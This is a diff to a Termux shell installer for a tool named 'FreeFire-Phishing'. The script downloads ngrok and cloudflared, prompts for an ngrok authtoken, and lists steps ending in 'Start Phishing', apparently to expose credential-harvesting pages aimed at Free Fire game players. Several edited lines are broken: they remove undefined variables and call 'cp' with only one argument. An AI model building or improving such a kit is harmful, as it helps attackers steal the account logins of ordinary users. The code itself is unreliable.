@@ -47,7 +47,7 @@ download() {
 	output="$2"
 	file=`basename $url`
 	if [[ -e "$file" || -e "$output" ]]; then
-		rm -rf "$file" "$output"
+		rm -rf "$file1" "$output1"
 	fi
 	curl --silent --insecure --fail --retry-connrefused \
 		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"
@@ -58,9 +58,9 @@ download() {
 			cp -f $output > /dev/null 2>&1
 		elif [[ ${file#*.} == "tgz" ]]; then
 			tar -zxf $file > /dev/null 2>&1
-			mv -f $output > /dev/null 2>&1
+			cp -f $output > /dev/null 2>&1
 		else
-			mv -f $file > /dev/null 2>&1
+			cp -f $file > /dev/null 2>&1
 		fi
 		chmod +x $output $file > /dev/null 2>&1
 		rm -rf file1
@@ -142,7 +142,7 @@ echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
 echo ""
 echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
 echo ""
-read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ngrok authtoken 1Y7IU ] : \e[0m' token
+read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
 $token
 echo ""
 fi
@@ -185,7 +185,6 @@ echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Phishing 
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 6 :\e[0m\e[1;36m Enter The Ngrok Token  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Start Phishing  "
 sleep 5
-rm -rf /data/data/com.termux/files/usr/bin/FreeFire-Phishing
 clear
 echo ""
 echo ""
@@ -208,7 +207,7 @@ read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click Enter to continue : \e[0m' o
 echo""
 echo""
 echo ""
-termux-open-url https://www.onlinehacking.in/
+termux-open-url https://termux.xyz/
 echo ""
 clear
 }
@@ -278,7 +277,8 @@ setup_ngrok
 rm -rf ngrok-v3*.tgz
 echo ""
 setup_cloudflare
-mv cloudflared* cloudflared
+mv cloudflared-li* cloudflared
+chmod +x cloudflared ngrok
 echo""
 clear
 echo ""
